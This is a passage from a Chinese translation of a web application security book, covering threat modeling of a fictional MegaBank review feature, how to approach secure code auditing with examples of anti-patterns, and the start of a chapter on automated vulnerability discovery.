  * 网络外部的第三方服务（例如，Datadog、CircleCI）
* 数据如何从一个模块流向下一个模块（数据流图 \[DFD\] 在这里很有帮助）？
  * 传输中的数据格式
  * 传输中的加密
  * 网络协议
* 为该功能配置网络的方式有哪些（内部/VPN、外部等）？
  * 防火墙
  * VPN
  * 物理网络
* 该功能使用了哪些身份验证和授权控制？
  * 是否允许使用多种类型的身份验证令牌？
  * 是否所有的 API 端点都执行相同类型的授权检查？
* 数据库 Schema 是什么？（是否有任何数据受到监管或控制？）
  * 无 Schema 的 NoSQL 数据库应该列出所有潜在的数据形状。

针对 MegaBank 的用户评价功能，我们虚构的安全工程师提出了以下（简化的）技术设计：

> 首先，我们现有的 React 用户界面将添加两个新组件。第一个组件是 `getReviews`，第二个是 `createReview`。这两个组件都将具有关联的数据库条目和 REST API 端点。
>
> `getReviews` 组件将针对我们部署在 AWS EC2 上的 HTTP REST 服务器发起 HTTP GET 请求，该服务器随后将查询 PostgreSQL 数据库，寻找与查询参数 `featureID` 中注明的特征相关联的评价。除非未找到任何评价，否则将返回与查询结果相关联的 JSON；如果未找到评价，则将返回一条错误，文本内容为“no reviews found for chosen feature”（未找到所选功能的评价）。
>
> `createReview` 组件将发起包含用户提交的表单信息的 HTTP POST 请求，该请求将首先通过向现有的会话管理服务检查其会话 Cookie，来验证用户是否已登录。如果此检查成功，相关的 AWS EC2 REST 端点将验证分数的类型是否为整数，评价的类型是否为文本，然后将其存储在 PostgreSQL 数据库中。
>
> 在客户端和 HTTP REST 服务器上使用的编程语言都将是 JavaScript。HTTP REST 服务器将运行 ExpressJS，并通过 npm 包管理器使用开源的 `body-parser` 和 `cookie-parser` 模块。所有的语言、框架和依赖项都运行在最新的稳定版本上。该 HTTP 服务器所在的硬件将是公司 AWS 云内部的一个 AWS EC2 实例。
>
> 通过网络发送的数据将通过 TLS 1.3 进行加密，使用的是由 Let’s Encrypt 生成的证书。
>
> 所有 API 也可以选择通过 GraphQL 进行查询。
>
> ——技术设计，MegaBank 用户评价威胁模型

在这种细粒度级别上，安全工程师可以开始对照逻辑设计来评估技术设计，其方式将使他们能够开始寻找传统 Web 应用漏洞和逻辑漏洞。

在此案例中，文本的渲染方式未被注明，这意味着这可能会成为一个 XSS 攻击向量。生成 SQL 查询的逻辑也未被注明，鉴于存储了用户提交的字符串，这是非常危险的。除此之外，在返回“未找到所选功能的评价”错误消息的情况下，可能存在信息泄露。如果一个功能尚未公开，遍历该 API 可能会泄露其存在。

通常，最好等到威胁模型的所有相关数据收集完毕后再头脑风暴潜在的漏洞，但有了妥善的数据收集，这些类型的漏洞将迅速显现。在开发过程中记录它们是个好习惯。

#### 威胁识别（威胁主体）

在搞定了逻辑设计和技术设计之后，是时候让 Holly Hacker 开始考虑威胁主体了。**威胁主体（Threat Actors）**是典型的攻击者——每个人都有攻击系统的独特途径（在此案例中，即 MegaBank 用户评价功能）。

在考虑威胁主体时，我们应该查看先前的设计文档，并开始头脑风暴每种类型的用户可能具有何种权限层级。这些不仅是程序化的授权层级，还包括在任何组织中自然产生的内部人员权限。例如，考虑针对该假设应用的潜在攻击者和表 24-1 中所示的权限。

*表 24-1. 潜在威胁主体*

| 威胁主体                                          | 权力与权限，风险                                             |
| :------------------------------------------------ | :----------------------------------------------------------- |
| 用户管理员 (User admin)                           | 可以使用管理员 UI 来读取/更新数据库。可能会利用职权窃取 PII。可能会修改现有的评分。目前，管理员工具的使用没有得到妥善的日志记录。缺乏审计问责。 |
| 客户支持用户 (Customer support user)              | 可以读取数据库数据，但无法更新字段。可能会窃取 PII。         |
| 评价聚合脚本 (Review aggregator script)           | 定期运行以计算跨多个评价的平均分。具有作为数据库管理员的直接数据库访问权限，无法访问其他实用工具或执行 Bash。如果被攻破，可以对数据库执行任何查询。具有重大的潜在破坏力。 |
| 已认证用户 (Authenticated user)                   | 可以发布评价和评分。可以阅读其他用户的公开评价。可能会尝试通过绕过 Web 表单并直接创建 HTTP POST，来发送注入 SQL 等恶意 Payload，或使评价产生溢出。 |
| 未认证（访客）用户 (Unauthenticated (guest) user) | 可以阅读评价分数。没有写入或更新权限。只要做好了防范 DoS 或循环图查询（Circular Graph Queries）的准备，威胁程度较低。 |

如您所见，在整理出所有潜在威胁主体的列表后，我们得出了一些意料之外的结论。首先，威胁主体列表应该是一份全面的应用用户列表——不仅是人类，还包括由机器驱动的用户。在此案例中，Linux 用户“评价聚合脚本”被添加到了威胁主体列表中，因为它是自主运行的，并且对支撑该新功能的 SQL 数据库拥有特权访问权限。

仅考虑直接的人类攻击是一个常见的错误，而仅考虑外部人类用户是一个更严重的错误。在整理您的威胁主体列表时，确保将内部用户、外部用户和机器用户都包含在内。此外，在可能的情况下，应将这些用户中的每一个划分为已认证和未认证的权限集。例如，您的应用处理未认证的公共用户权限的方式很可能与已认证的公共用户不同。因此，在您的威胁建模活动期间，应当单独考虑这些用户中的每一个。

请注意以下显而易见但至关重要的细节：这些威胁主体中的每一个都拥有不同的攻击面，即他们可以利用的攻击类型和方法。虽然这看起来像是一个显而易见的细节，但在整个威胁建模以及开发过程中牢记这一点非常重要，因为它可以协助您和您的组织对风险进行适当排序，从而使您在处理危险程度较低的攻击之前，能够识别并解决来自最危险威胁主体的最重大攻击。

#### 威胁识别（攻击向量）

在记录了潜在威胁主体的知识后，现在是时候考虑对您的应用构成威胁的“威胁”了。我们可以将这些威胁分类为**攻击向量（Attack Vectors）**——由于系统尚未开发，它们目前还不是漏洞。相反，它们是威胁主体未来可能攻击您系统的潜在途径。

通常，在威胁建模活动中头脑风暴攻击向量的最佳方式，是对上述三个组件进行交叉分析：逻辑设计、技术设计和威胁主体。

逻辑设计暴露了在查看技术设计时相关的业务逻辑组件。例如，在技术设计中可能会根据实现来定义权限系统，但如果没有逻辑设计，就很难确定权限系统是否以一种可以被利用的方式实现。这类系统中的边缘案例在生产环境应用中非常常见。

接下来，我们在评估攻击向量时需要考虑威胁主体。并非所有的攻击向量都是所有威胁主体都可行实施攻击的。某些攻击向量将需要某种特权访问；例如，内部 VPN 访问或登录到仅限管理员的服务器应用的凭证。通过不断考虑这些类别之间的关系，我们可以识别出谁能够、谁不能够利用某个攻击向量。

因此，我们的攻击向量表融合了威胁模型中先前所有标题下的知识，加上一个风险评级列（严重性/Severity），以帮助我们优先分配修复的时间和资源。我们最终的表格将类似于表 24-2 中汇总的信息。

*表 24-2. 攻击向量*

| 威胁名称                                                  | 严重性 | 威胁主体               | 描述                                                         |
| :-------------------------------------------------------- | :----- | :--------------------- | :----------------------------------------------------------- |
| 不恰当的验证——分数 (Improper validation — score)          | P1     | 除访客用户外的所有用户 | 由于缺乏明确定义的验证，用于创建新评价的 POST 请求可以包含一个超出 0 到 5 范围的分数，导致聚合后的评分失真。 |
| 信息泄露——FeatureID (Information disclosure — FeatureID)  | P3     | 所有用户               | 在 `getReviews` 端点上提供的错误消息允许用户扫描潜在的未发布功能或他们不应该知道其存在的受控（Gated）功能。 |
| SQL 注入 (SQL injection)                                  | P0     | 除访客用户外的所有用户 | POST Payload 上的不当实现可能会导致针对 `postReview`（译者注：原文中前文写为 createReview）端点的 SQL 注入。 |
| GraphQL 循环与大查询 (GraphQL circular and large queries) | P1     | 所有用户               | 可能会发起在传统 REST 中无法实现的循环和大型查询。这些无法通过速率限制（Rate Limits）来防范，需要最大查询时间来限制。 |
| GraphQL 内省与错误 (GraphQL introspection and errors)     | P1     | 所有用户               | 应该禁用 GraphQL 的内省（Introspection）引擎，否则我们将泄露服务器配置细节。如果未对 GraphQL 内部错误进行抑制并替换为自定义错误，它们也会泄露服务器信息。 |
| 高 privilege 用户攻击 (High privilege user attacks)       | P0     | 管理员和评论聚合脚本   | 特权令牌（Tokens）拥有读取/更新数据库的权限，但缺乏任何监控或审计。一个被窃取的凭证可能会危害整个系统。 |

> 注：P 代表优先级（Priority）。P0–P4 是安全行业中用于指定严重程度的常用标注，其中 P0 最高，P4 最低。

如您所见，通过交叉引用威胁建模的前面章节，我们能够得出几种攻击面，并将它们中的每一个与特定的威胁主体（或一组威胁主体）联系起来。攻击面表仅作为示例不尽完整，但它展示了几个关键点。

首先，有许多攻击面源自内部威胁主体。从管理员用户到服务器上运行的内部脚本，您永远不能假设只有预期用途的功能才会被调用。内部用户会被黑客入侵、会变节，或者在机器用户的情况下，发生故障或遇到 Bug。这些情况中的每一种都需要在威胁建模期间进行处理，否则系统就是运行在“最佳情况”模型上，而不是“最坏情况”模型上。在处理安全问题时，必须首先考虑最坏的情况。

接下来，我们可以看到，这些攻击向量中的每一个都呈现出不同的严重程度——也就是说，对公司或产品带来的风险不同。计算严重程度的方式将在未来的章节中深入讨论，但目前重要的是简单地注意到，并非所有的攻击向量都具有同等风险。这是一件好事，因为当团队规模或工作能力有限时，这是对工作进行优先级排序的一种有价值的方法。

最后，我们注意到了从 SQL 注入到逻辑漏洞的各种攻击。威胁建模帮助我们识别出我们的产品或功能面临哪些典型风险，这在购买工具或投入工程工时时会大有帮助。如果没有这些数据，工时或资金可能会被糟糕地投向那些防范极不可能发生的攻击的工作上。

### 识别缓解措施

在威胁模型的第一部分中，我们收集并整理了理解此新功能所需的全部数据。我们评估了逻辑设计，并在随后深入研究了技术设计。通过该数据收集阶段，我们识别出了威胁主体——即可能攻击我们系统的用户。

在识别出威胁主体后，我们利用收集到的信息，以攻击向量的形式识别出了风险。这些攻击向量代表了威胁主体攻击我们系统的方法。

构建优秀威胁模型的下一步，是为发现的每个攻击向量识别缓解措施。这一步非常简单；它纯粹是一个数据收集阶段。

我们示例功能的现有缓解措施如表 24-3 所示。

*表 24-3. 现有缓解措施*

| 缓解措施名称 | 被缓解的攻击向量 | 描述                                                         |
| :----------- | :--------------- | :----------------------------------------------------------- |
| 验证逻辑     | 不当验证——分数   | 我们的验证引擎会拒绝任何非整数或超出 0 到 5 范围的分数。这防止了聚合错误。 |
| SQL 注入缓解 | SQL 注入         | 所有调用 SQL 代码的调用都使用我们的领域特定语言（DSL），这强制使用预编译语句（Prepared Statements）来防止 SQL 注入攻击。 |

从表中可以看出，此应用针对不当验证和 SQL 注入类攻击拥有现成的缓解措施。我们在攻击向量识别阶段注意到的其余攻击没有已知的缓解措施。

### 差值识别

现在，攻击向量和现有的缓解措施都已记录在案，我们来到了威胁建模最重要的阶段之一：差值（Delta）识别。

在这里，我们交叉引用攻击向量与缓解措施列表，移除所有已具有充分缓解措施的攻击向量。这使我们剩下了如表 24-4 所示的列表。

*表 24-4. 差值识别*

| 漏洞名称             | 严重程度 | 威胁主体             | 描述                                                         |
| :------------------- | :------- | :------------------- | :----------------------------------------------------------- |
| 信息泄露——FeatureID  | P3       | 所有用户             | 在 `getReviews` 端点上提供的错误消息允许用户扫描潜在的未发布功能或他们不应该知道其存在的受控功能。 |
| GraphQL 循环与大查询 | P1       | 所有用户             | 可能会发起在传统 REST 中无法实现的循环和大型查询。这些无法通过速率限制来防范，需要最大查询时间来限制。 |
| GraphQL 内省与错误   | P1       | 所有用户             | 应该禁用 GraphQL 的内省引擎，否则我们将泄露服务器配置细节。如果未对 GraphQL 内部错误进行抑制并替换为自定义错误，它们也会泄露服务器信息。 |
| 高特权用户攻击       | P0       | 管理员和评论聚合脚本 | 特权令牌拥有读取/更新数据库的权限，但缺乏任何监控或审计。一个被窃取的凭证可能会危害整个系统。 |

针对这些未缓解的攻击向量中的每一个，我们都必须头脑风暴一个充分的缓解措施。如果对每个未缓解的攻击向量没有充分的缓解措施，该功能就不应该被允许发布。表 24-5 列出了针对已识别攻击向量的缓解措施。

*表 24-5. 针对已识别攻击向量的缓解措施*

| 缓解措施名称     | 被缓解的攻击向量     | 描述                                                         |
| :--------------- | :------------------- | :----------------------------------------------------------- |
| 更好的错误消息   | 信息泄露——FeatureID  | 错误消息应该通用，不提供有关我们应用或数据的任何敏感信息。   |
| GraphQL 计算限制 | GraphQL 循环与大查询 | 由于 GraphQL 查询可能会变得极其昂贵和自引用，除了速率限制之外，我们必须为每个查询实现最大计算时间。在此计算时间结束时，请求将失败。 |
| GraphQL 配置     | GraphQL 内省与错误   | GraphQL 绝不能暴露其自身的任何错误消息，且必须关闭内省查询。 |
| 特权权限重构     | 高特权用户攻击       | 为了防止由被窃取的用户或认证令牌造成的损害，特权用户令牌将仅被赋予该用户所需的最小功能范围。此外，每次 API 调用都将使用一种特权用户无法撤销或删除日志的机制，将日志记录在平台之外。此外，评价聚合脚本将仅对数据库中的一列（聚合分数）拥有写权限，对另一列（分数）拥有读权限。 |

在记录并落实这些缓解措施后，下一步是每当实现一项缓解措施时就将其勾除，并将威胁模型指向其实现。一旦所有的缓解措施都得以实现，威胁模型的直接目的就完成了，功能的开发可以继续向前推进。

然而，如果该功能的范围在未来有所扩大，那么就到了重新审视威胁模型的时候。届时，我们将更新先前文档化的知识，更新威胁主体和攻击向量，并重新评估缓解措施和差值。

### 总结

如您所见，威胁模型是一个极好的全方位安全工具。一个妥善实现的威胁模型能够在单一的集中式仓库中同时记录技术知识和安全知识，使其成为一个长期存在且高效的信息源。

此外，威胁建模活动本身就非常能够在应用甚至还未开发之前，就识别出威胁主体（攻击者）和攻击向量（潜在漏洞）。

最后，通过识别攻击向量并将其与现有缓解措施列在一起，可以在开发阶段的早期开始提炼系统的安全姿态，此时修复这些问题的成本最低。有人说，在架构阶段修复 10 小时，抵得上发布后修复 100 小时。如果这是真的，一个优秀的威胁模型可能是任何安全工程师工具箱中最具成本效益的安全工具之一。

---

## 第 25 章审计代码安全
在具有安全意识的组织中，代码审计阶段必须始终发生在架构阶段之后——绝不能在其之前。

如今的一些科技公司奉行“小步快跑，破局创新”（move fast and break things）的教条，但这种哲学往往被滥用，并被用作忽视妥善安全流程的借口。即使在快速发展的公司中，在发布代码之前对应用架构进行审查也是势在必行的。虽然从安全角度来看，提前审查整个功能的架构是最理想的，但在不确定性因素较多的情况下，这可能并不可行。但至少，主要和广为人知的功能应该进行架构设计和审查。当出现新功能时，它们也应该在开发之前进行架构设计和安全审查。

审查代码安全差距的合适时机，是一旦代码提交背后的架构得到了妥善审查之后。这意味着在遵循安全开发最佳实践的组织中，代码审计应当是第二步。

这有两个好处。第一也是最显而易见的好处是安全，但拥有一位通常从直接开发团队外部审视代码的额外审查者，其本身也有其独特的价值。这为开发人员提供了一双不带偏见的眼睛，可能会捕获到其他情况下无法发现的 Bug 和架构缺陷。

因此，代码安全审查阶段对于应用功能和应用安全都至关重要。在仅具有功能审查的组织中，代码安全审查应该作为额外的步骤来实现。这样做将极大地减少原本会发布到生产环境中的高影响安全 Bug 的数量。

通常来说，代码安全审查在合并请求（Merge Requests，传统上也称为拉取请求 / Pull Requests，但在大多数情况下后者是不太准确的术语）上进行时最具有意义。在合并时进行代码安全审查是合理的，因为完整的功能集已经开发完毕，并且所有需要连接的系统都应该已经完成了集成。这是可以在单次会议中审查代码完整范围的一个时间点。

将代码安全审查以更细粒度的方法交织在开发流程中也是可能的，例如，在每次提交时进行，甚至使用结对编程（Pair Programming）方法。这两种方法都需要持续、不间断的工作，因为两者都是在未能涵盖代码完整范围的某个时间点来审视代码。然而，对于任务关键型的安全功能，这可能是一个明智的选择。由于一个人专注于功能，另一个人专注于安全，因而有可能编写出在合并请求时进行审查所无法实现的极具安全意识的功能。

您的组织选择审查其代码安全漏洞的时机取决于该组织本身，并且必须与其现有的流程相契合。然而，上述方法很可能是将安全代码审计集成到您的开发流程中最实用且有效的方法。

### 如何开始代码审计

代码安全审查的运作方式应该与代码功能审查非常相似。功能审查在几乎每个开发组织中都是标准流程，这使得代码安全审查的学习曲线要短得多。

审查代码安全的第一步是将有疑问的分支拉取到本地开发机上。一些组织允许在基于 Web 的编辑器中进行审查，但这些在线工具并不像您在本地可以利用的工具那样全面。

以下是一个可以从终端完成的常见本地审查流程：

1. 使用 `git checkout main` 签出主分支。
2. 使用 `git pull origin main` 获取并合并最新的 master/main 分支。
3. 使用 `git checkout <username>/feature` 签出功能分支。
4. 使用 `git diff origin/main...` 对主分支运行 diff。

`git diff` 命令应该返回两件事：

* 主分支与当前分支之间存在差异的文件列表。
* 这些文件在主分支和当前分支之间的更改列表。

这是任何代码功能审查和任何代码安全审查的起点。两者的差异在此点之后开始。

### 典型漏洞与业务逻辑漏洞

代码功能审查检查代码以确保其符合功能规格说明书，且不包含可用性 Bug。代码安全审查检查常见的漏洞，例如 XSS、CSRF、注入等，但更重要的是检查**逻辑级漏洞（Logic-Level Vulnerabilities）**，这些漏洞需要深入了解代码意图的背景，且无法通过自动化工具或扫描器轻易发现。

为了发现由于逻辑 Bug 产生的漏洞，我们首先需要掌握有关功能目标的上下文背景。这意味着我们需要了解该功能的用户、功能的操作逻辑以及该功能带来的业务影响。

在这里，当我们谈论漏洞时，我们遇到了与本书主要讨论的内容之间的一些差异。我们研究的大多数漏洞都是广为人知的常见漏洞范式。但是，一个具有非常特定用例的应用，极有可能包含无法在旨在进行通用软件安全教育的书中列出的漏洞。

考虑以下关于将要集成到 MegaBank 的新社交媒体功能——MegaChat 的上下文背景：

* 我们正在构建一个社交媒体门户，允许注册用户申请会员资格（Membership）。
* 会员资格由管理员（Moderators）根据在入会前对用户活动的审查来进行批准。
* 用户拥有限制的功能，但在升级为会员后，他们将获得更丰富的功能。
* 管理员会自动获得会员功能以及额外的管理能力。
* 与只能发布文本媒体的用户不同，会员可以上传游戏、视频和艺术作品。
* 我们限制会员资格，因为托管这种类型的媒体非常昂贵，我们希望减少低质量内容的数量，并保护我们自己免受那些只想托管其内容的机器人账户和白嫖党（Freeloaders）的侵害。

从中我们可以收集到以下信息：

**用户与角色 (Users and roles)**
* 用户是 MegaBank 的客户。
* 用户被分为三个角色：用户（默认）、会员和管理员。
* 每个用户角色都有不同的权限和功能。

**功能逻辑 (Feature functionality)**
* 用户、会员和管理员都可以发布文本。
* 会员和管理员可以发布视频、游戏和图像。
* 管理员可以使用管理功能，包括将用户升级为会员。

**业务影响 (Business impact)**
* 托管视频、游戏和图像的成本很高。
* 成员身份伴随着被白嫖（存储/带宽成本）和机器人（存储/带宽成本）的风险。

一个**典型的安全漏洞（Archetypical Vulnerability）**会是用户发布的帖子中存在 XSS。而一个**业务逻辑漏洞（Business Logic Vulnerability）**会是一个由于编码不当、允许用户在发送 Payload 时携带 `isMember: true` 从而能够发布视频的特定 API 端点，即便该用户并未获得管理员授予的会员资格。

代码审计正是我们寻找典型漏洞并尝试发现需要深厚应用背景的业务逻辑漏洞的地方。

### 从哪里开始安全审查

理想情况下，您应该从应用中风险最高的组件开始您的代码审计。然而，如果您被要求对一个您没有参与设计的应用进行安全审计，您可能并不总是清楚这些组件是什么。这在咨询工作或处理现有产品时经常发生。

因此，我提出了一个框架，以简化安全代码审计流程并帮助您开始进行安全审查。该框架可以使用到您对给定的应用足够熟悉、能够开始基于风险评估应用功能为止。

设想一个基本的 Web 应用，它由两个组件组成：浏览器中的客户端和与该客户端通信的服务器。当然，我们可以从审查服务端代码开始。实际上，这并没有任何问题。但是，服务器上可能存在未向客户端暴露的功能。这意味着，在对旨在提供给用户的特定功能（相对于内部方法等）没有良好理解的情况下，您的精力可能会意外地集中在较低风险的代码上，而高风险的代码本应被优先处理。

这是一个很难理解的概念，但就像在第 21 章关于安全应用架构中一样，我们需要意识到，在理想的世界中，每一页应用代码都应该得到同等的审计。遗憾的是，这反映的是一个理想世界。在现实世界中，往往存在需要关注的截止日期、时间表以及替代项目。

因此，在实际源码中，一个良好的起点是客户端（浏览器）向服务器发起请求的任何地方。从客户端开始是极好的，因为它将开始让您对您正在处理的攻击面有一个清晰的认识。从那里，您可以了解到客户端和服务器之间交换了何种类型的数据，以及是否使用了多个服务器而不是一个。此外，您可以了解正在交换的 Payload，以及这些 Payload 在服务器上是如何被解析的。

在评估了客户端本身之后，顺着客户端的 API 调用回到服务器。开始评估将客户端和服务器连接在 Web 应用中的调用。

一旦此过程完成，您应该考虑追踪这些 API 所依赖的辅助方法（Helper Methods）、依赖项和功能。这意味着评估数据库、日志、上传的文件、转换库，以及 API 端点直接或通过辅助库调用的任何其他内容。

接下来，通过查看*可能*向客户端暴露但未被直接调用的每一点功能来查缺补漏。这可能是为了支持即将推出的功能而构建的 API，或者可能只是意外暴露且本应作为内部功能的功能。

最后，在代码库中的这些主要点都被覆盖后，将您的时间奉献给代码库的其余部分。通过分析业务逻辑和基于您设想该应用会遇到的风险进行优先级排序，来确定所采取的路径。

总结一下，确定在 Web 应用的安全审查中审查哪些代码的有效方法如下：

1. 评估客户端代码，以获得对业务逻辑的理解，并理解用户将能够使用哪些功能。
2. 利用从客户端审查中获得的知识，开始评估 API 层，特别是您通过客户端审查发现的 API。在此过程中，您应该能够很好地理解 API 层依赖哪些依赖项来运行。
3. 追踪 API 层中的依赖项，仔细审查数据库、辅助库、日志函数等。在此过程中，您将接近覆盖大多数面向用户的功用。
4. 利用与客户端链接的 API 结构知识，尝试寻找可能无意中暴露或旨在供未来功能发布的任何面向公众的 API。在发现它们时对其进行审计。
5. 继续贯穿代码库的其余部分。这实际上应该非常容易，因为您通过有机的方式阅读了代码库，已经对其非常熟悉，而不是试图硬着陆去理解应用架构。

这并不是完成安全审查的唯一工作方法，某些具有特定安全需求的应用可能需要不同的审查路径。然而，我建议采用这条路径，因为它将以有机的节奏赋予您对应用的熟悉度，并允许您在将潜在的低风险功能留到最后的同时，优先处理面向用户的功能。

随着您对安全代码审计流程以及您所审查的特定应用越来越熟悉，您应该能够修改这一组指南，以更好地契合您的应用以及您的应用所面临的风险。

### 安全编码反模式

代码级别的安全审计与编写代码前进行的架构设计审查有一些相似之处。代码审计与架构设计审查的不同之处在于，它们是实际发现漏洞的理想时间点，而在架构设计阶段提出此类漏洞时，它们仅仅是假设性的。

在进行任何安全审查时，需要提防许多反模式（Anti-Patterns）。很多时候，反模式只是一个仓促实现的解决方案，或者是一个在没有相应背景知识的情况下实现的解决方案。无论原因如何，理解如何识别反模式确实有助于加快您的审查流程。

以下反模式都非常常见，但如果它们进入生产环境构建，每一个都可能会对系统造成破坏。

#### 黑名单

在安全世界中，临时的缓解措施通常应该被忽视，而应该寻找永久的解决方案，即使需要花费更长的时间。只有在存在预先规划的时间表、且将从中设计和实现真正的完整解决方案的情况下，才应该实现临时或不完整的解决方案。黑名单（Blocklists）是临时或不完整安全解决方案的一个例子。

设想您正在为您的应用可以集成的可接受域名列表构建一个服务端过滤机制：

```javascript
const blocklist = ['http://www.evil.com', 'http://www.badguys.net'];

/*
 * 确定域名是否允许集成。
 */
const isDomainAccepted = function(domain) {
 return !blocklist.includes(domain);
};
```

这是一个常见的错误，因为它看起来像是一个解决方案。但即使它目前起到了解决方案的作用，它也可以被认为是不完整的（除非考虑了对所有域名的完美认知，但这极不可能）和临时的（即使对当前所有域名有完美的认知，未来也可能会引入更多恶意的域名）。

换句话说，黑名单只有在您对所有当前和未来可能的输入拥有完美认知的情况下，才能保护您的应用。如果这两者都无法获得，黑名单将无法提供充分的保护，并且通常只需稍加努力就可以被绕过（在这种情况下，黑客只需再买一个域名）。

在安全世界中，白名单（Allowlists）总是更可取的。只需颠倒允许集成的方式，此过程就可以变得安全得多：

```javascript
const allowlist = ['https://happy-site.com', 'https://www.my-friends.com'];

/*
 * 确定域名是否允许集成。
 */
const isDomainAccepted = function(domain) {
 return allowlist.includes(domain);
};
```

有时，工程师会争辩说白名单会创建困难的产品开发环境，因为随着列表的增加，白名单需要持续的人工或自动维护。如果是人工维护，这确实会成为一个负担，但人工和自动维护的结合可以在保持大部分安全收益的同时，使维护变得容易得多。

在这个例子中，要求集成合作伙伴在被加入白名单之前提交他们的网站、营业执照等进行审查，将使恶意集成极难混入。即使他们混入了，一旦从白名单中移除，他们也很难再次混入（他们需要一个新的域名和营业执照）。

#### 样板代码

另一个需要注意的安全反模式是样板代码（Boilerplate Code）或默认框架代码的使用。这是一个大问题，而且很容易被忽视，因为框架和库往往需要花费精力来收紧安全，而它们本应该开箱即用就带有高度的安全，并需要手动放宽。

这方面的一个经典例子是 MongoDB 中的一个配置错误，该错误导致旧版本的 MongoDB 数据库在安装到 Web 服务器上时，默认情况下可以通过互联网访问。加上数据库上没有强制性的身份验证要求，这导致网络上数以万计的 MongoDB 数据库被脚本劫持，并索要比特币以换取其归还。配置文件中的几行代码本可以通过阻止 MongoDB 被互联网访问（仅限本地访问）来解决此问题。

在世界上使用的大多数主要框架中都可以找到类似的问题。以 Ruby on Rails 为例。使用样板 404 页面代码可以轻易泄露您正在使用的 Ruby on Rails 版本。EmberJS 也是如此，它有一个旨在在生产应用中被移除的默认着陆页。

框架为开发人员抽象掉了烦人、困难和常规的工作，但如果开发人员不理解框架中发生的抽象，那么该抽象极有可能在没有妥善安全机制就绪的情况下被错误地实施。因此，避免将任何样板代码发布到生产环境中，除非该样板代码得到了妥善的评估和配置。

#### 默认信任

当构建一个具有多个功能级别的应用（所有这些功能都会向宿主操作系统请求资源）时，为您的代码实现妥善的权限模型至关重要。

设想一个能够生成服务端日志、向磁盘写入文件并对 SQL 数据库执行更新的应用。在许多实现中，服务器上会生成一个拥有日志记录、数据库访问和磁盘访问权限的用户账户。应用将在该用户账户下运行所有功能。然而，这意味着如果发现了一个允许执行代码或改变脚本预期执行的漏洞，这三个宝贵的服务端资源都可能会失陷。

相反，一个安全的应用应该独立于彼此地生成用于日志记录、向磁盘写入和执行数据库操作的权限。安全应用中的每个模块都将在其自身的用户下运行，并带有专门配置的、仅允许该特定功能运行所需的操作权限。通过这样做，一个模块中的关键故障将不会泄露到其他模块，并且 SQL 模块中的漏洞不应该给黑客提供访问服务器上文件或日志的权限。

#### 客户端/服务端分离

最后一个需要提防的反模式是客户端/服务端耦合反模式。当客户端和服务器应用代码如此紧密地绑定，以至于一个无法在没有另一个的情况下运行时，就会发生这种反模式。这种反模式大多出现在较旧的 Web 应用中，但在今天的单体应用中仍然可以找到。一个由客户端和服务器组成的安全应用应该独立开发客户端和服务器，并且两者应该使用预定义的数据格式和网络协议通过网络进行通信。

由客户端和服务器代码深度耦合组成的应用，例如带有身份验证逻辑的 PHP 模板代码，由于缺乏分离，变得更容易被利用。一个模块不是去读取网络请求的结果，而是发回其 HTML 代码，包括任何表单数据（例如，在处理身份验证时）。然后，服务器必须负责解析该 HTML 代码，并确保在 HTML 代码和身份验证逻辑内部没有发生脚本执行或参数篡改。

在完全分离的客户端/服务端应用中，服务器不负责 HTML 数据的结构和内容。相反，服务器拒绝发送的任何 HTML，并且仅接受使用预定义数据传输格式的身份验证 Payload。

在分布式应用中，每个模块负责较少的独特安全机制。另一方面，耦合了客户端和服务器代码的单体应用必须考虑针对多种语言的安全机制，并考虑到接收的数据可能会以大量方式进行格式化，而不是单一的、预定义的方式。

总之，从工程视角和安全视角来看，关注点分离（Separation of Concerns）始终至关重要。妥善分离的模块会带来更易于管理的安全机制，这些机制不需要重叠，也不需要考虑由于多种数据/脚本类型之间的复杂交互而产生的罕见边缘案例。

### 总结

当为了安全而审计代码时，我们需要考虑的不仅仅是寻找常见的漏洞（我们将在接下来的章节中讨论这些漏洞）。我们还需要考虑应用中的反模式，这些反模式看起来像是解决方案，但日后会演变成问题。代码安全审计也应该是全面的——覆盖所有可能发现漏洞的潜在领域。

在代码审计期间，我们需要考虑应用的具体使用要求，以便我们能够理解可以引入哪些逻辑漏洞，这些漏洞不会轻易契合到常见的、预定义的漏洞范式中。当开始代码审计时，我们应该采取一条逻辑路径，使我们能够获得对应用用例的理解，以便我们可以开始评估和估算应用中的风险。在已经确立且高风险领域众所周知的应用中，大部分审计精力应该集中在这些领域，其余领域按风险降序进行审计。

最终，如果做好的话，将安全审查集成到您的代码审查流水线（Pipeline）中将帮助您减轻向代码库引入漏洞的几率。代码安全审查流程应该成为任何现代软件开发流水线的一部分，并且在可能的情况下，它应该由具备安全知识的工程师与产品或功能开发人员共同执行。

---

## 第 26 章 漏洞发现
在设计、编写和审查了安全的架构代码之后，应该建立一个流水线，以确保没有漏洞成为漏网之鱼。通常，具有最佳架构的应用所经历的漏洞数量最少，且漏洞风险最低。在此之后，具有充分安全代码审计流程就绪的应用所经历的漏洞，要少于没有此类流程的应用（但多于具有默认安全架构的应用）。

即使是安全架构且经过充分审计的应用，仍然会沦为偶尔出现的漏洞的牺牲品。漏洞可以溜过审计，或者由于应用在不同环境中运行或其预期环境升级时的非预期行为而产生。因此，您需要建立漏洞发现流程，该流程针对的是生产环境代码，而不是开发前期的代码。

### 安全自动化

在架构和审计阶段之外，发现漏洞的初始步骤是自动化阶段。自动化漏洞发现是必不可少的，但这并不是因为它能捕获所有的漏洞。相反，自动化（通常）是廉价、有效且持久的。

自动化的发现技术在寻找可能溜过架构师和代码审计人员的代码中的常规安全缺陷方面非常出色。自动化发现技术不擅长寻找特定于您应用功能的逻辑漏洞，也不擅长寻找需要通过“链路结合/立体利用”（Chaining）才能发挥作用的漏洞（即当结合使用时产生高危漏洞的多个低危漏洞）。

安全自动化有几种形式，最常见的是：

* 静态分析 (Static analysis)
* 动态分析 (Dynamic analysis)
* 漏洞回归测试 (Vulnerability regression testing)

这些自动化形式中的每一种在应用开发生命周期中都有不同的目的和位置，但每一种都是不可或缺的，因为它们会拾取其他形式无法拾取的漏洞类型。

#### 静态分析

您应该编写的、可能也是最常见的第一种自动化类型是静态分析（Static Analysis）。静态分析器是查看源代码并评估代码中的语法错误和常见错误的脚本。静态分析可以在开发期间在本地发生（Linter），也可以按需针对源代码仓库发生，或者在每次向 main/master 分支提交/推送时发生。

存在许多健壮且强大的静态分析工具，例如以下几种：

* Checkmarx（支持大多数主流语言——付费）
* PMD（Java——免费）
* Bandit（Python——免费）
* Brakeman（Ruby——免费）

